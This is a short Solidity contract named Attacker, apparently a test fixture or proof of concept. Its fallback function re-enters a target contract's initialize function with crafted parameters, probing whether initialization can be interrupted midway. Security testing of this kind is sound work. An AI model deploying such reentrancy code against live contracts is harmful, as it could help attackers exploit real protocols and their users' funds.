contract Attacker {
    address public target;
    bool public attacked;

    constructor(address _target) {
        target = _target;
    }

    // Fallback triggers a reentrant initialize call to try to observe initialized=true before nft set
    fallback() external payable {
        if (!attacked) {
            attacked = true;
            // craft some innocuous params; use address(0) for baseToken and trivial values
            // We avoid infinite recursion by attacked flag.
            bytes memory data = abi.encodeWithSelector(
                C.initialize.selector,
                address(0),
                address(this),
                uint128(1),
                uint128(1),
                uint56(0),
                uint16(0),
                bytes32(0),
                false,
                false
            );
            // ignore return
            (bool,) = address(target).call(data);
        }
    }
}

